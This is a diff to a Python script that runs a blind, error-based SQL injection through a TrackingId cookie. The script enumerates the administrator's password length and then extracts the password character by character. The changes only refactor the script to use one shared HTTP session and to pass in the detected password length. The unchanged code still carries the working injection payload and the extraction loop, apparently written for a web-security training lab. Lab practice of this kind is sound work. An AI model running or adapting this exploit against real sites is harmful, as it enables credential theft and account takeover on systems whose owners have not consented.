@@ -1,14 +1,11 @@
 import sys
 import requests
 import string
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter, Retry
 
 
 
-def enumerate_password_length(url):
-    session = requests.Session()
-    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+def enumerate_password_length(url, session):
     password_length = 0
     for i in range(1, 50):
         payload = f"TrackingId=abc'||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
@@ -19,9 +16,7 @@ def enumerate_password_length(url):
     return password_length
 
 
-def enumerate_password(url, length):
-    session = requests.Session()
-    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+def enumerate_password(url,session, length):
     alphanumeric_characters = string.ascii_lowercase + string.digits
     password = ""
     print("(+) Enumerating password...")
@@ -45,10 +40,13 @@ def main():
         sys.exit(1)
 
     url = sys.argv[1]
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
     print("(+) Enumerating password length... ")
-    password_length = enumerate_password_length(url)
+    password_length = enumerate_password_length(url, session)
     print(f"(+) Password length: {password_length}")
-    enumerate_password(url, 20)
+    enumerate_password(url, session, password_length)
     print()
 
 
